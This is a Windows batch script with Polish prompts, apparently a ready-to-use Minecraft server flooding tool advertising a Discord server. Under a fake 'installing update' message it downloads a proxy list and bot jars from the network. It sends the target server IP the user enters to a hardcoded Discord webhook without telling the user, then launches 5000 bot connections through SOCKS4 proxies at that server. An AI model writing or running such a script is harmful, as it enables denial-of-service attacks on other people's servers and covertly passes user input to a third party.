@echo off
title https://discord.gg/fKrgr5TmPr
:menu
set webhook=https://discord.com/api/webhooks/1280143632485322813/qT4LzWo5JNbjzQysMhhTACB0J_-tegATDxtMWXv17mM9wPqfBxZK2iyG_bvVtS5NGBXn
chcp 65001
mode 80,15.
mode 130,30
echo.
echo.
echo.
echo 							   █▀▀ ▀█▀ █ █
echo 							   █▄▄  █  █▀█
echo.
echo.
echo                                       	            Instalowanie aktualizacji.
cd %temp%
curl -s https://raw.githubusercontent.com/hvhplayerdavid/gownowdupiechlupie/main/proxies.txt --output proxies.txt
curl -s https://github.com/crpmax/mc-bots/releases/download/v1.2.11/mc-bots-1.2.11.jar --output mc-bots-1.2.11.jar
curl -s https://github.com/crpmax/mc-bots/releases/download/v1.2.10/mc-bots-1.2.10.jar --output mc-bots-1.2.10.jar
curl -s https://github.com/crpmax/mc-bots/releases/download/v1.2.9/mc-bots-1.2.9.jar --output mc-bots-1.2.9.jar
curl -s https://github.com/crpmax/mc-bots/releases/download/v1.2.8/mc-bots-1.2.8.jar --output mc-bots-1.2.8.jar
curl -s https://github.com/crpmax/mc-bots/releases/download/v1.2.7/mc-bots-1.2.7.jar --output mc-bots-1.2.7.jar
curl -s https://github.com/crpmax/mc-bots/releases/download/v1.2.6/mc-bots-1.2.6.jar --output mc-bots-1.2.6.jar
curl -s https://github.com/crpmax/mc-bots/releases/download/v1.2.4/mc-bots-1.2.4.jar --output mc-bots-1.2.4.jar
curl -s https://github.com/crpmax/mc-bots/releases/download/v1.2.3/mc-bots-1.2.3.jar --output mc-bots-1.2.3.jar
timeout 1 >nul
cls
:menu
echo.
echo.
echo.
echo 							   █▀▀ ▀█▀ █ █
echo 							   █▄▄  █  █▀█   
echo.                                               ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo                                                ┃                                 ┃
echo                                                ┃  https://discord.gg/fKrgr5TmPr  ┃
echo                                                ┃                                 ┃
echo                                                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
echo.
echo.
echo                                                         Podaj IP serwera
set /p ip= 
cls
echo.
echo.
echo.
echo 							   █▀▀ ▀█▀ █ █
echo 							   █▄▄  █  █▀█   
echo.                                               ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo                                                ┃                                 ┃
echo                                                ┃           Dev: Bezik            ┃   
echo                                                ┃  https://discord.gg/fKrgr5TmPr  ┃
echo                                                ┃                                 ┃
echo                                                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
echo.
echo.
echo                                                Wybierz nazwy botów (Wybrane/Losowe)
set /p nazwabotow=
cls
echo.
echo.
echo.
echo 							   █▀▀ ▀█▀ █ █
echo 							   █▄▄  █  █▀█   
echo.                                               ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo                                                ┃                                 ┃
echo                                                ┃           Dev: Bezik            ┃   
echo                                                ┃  https://discord.gg/fKrgr5TmPr  ┃
echo                                                ┃                                 ┃
echo                                                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
echo.
echo.
echo                                                Podaj wersje serwera (1.18.2-1.20.6)
set /p wersja=
if %wersja%==1.18.2 set XD=mc-bots-1.2.3.jar
if %wersja%==1.19 set XD=mc-bots-1.2.4.jar
if %wersja%==1.19.1 set XD=mc-bots-1.2.6.jar
if %wersja%==1.19.2 set XD=mc-bots-1.2.6.jar
if %wersja%==1.19.4 set XD=mc-bots-1.2.7.jar
if %wersja%==1.20.1 set XD=mc-bots-1.2.8.jar
if %wersja%==1.20.2 set XD=mc-bots-1.2.9.jar
if %wersja%==1.20.4 set XD=mc-bots-1.2.10.jar
if %wersja%==1.20.6 set XD=mc-bots-1.2.11.jar
timeout 1>nul
echo [36mNapierdalamy!!!
timeout 0 >nul
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```Server IP: %ip% Bot names: Losowe```\"}" %webhook%
java -jar %XD% -s %ip% -r -d 0 1 -c 5000 -l %temp%\proxies.txt -t socks4
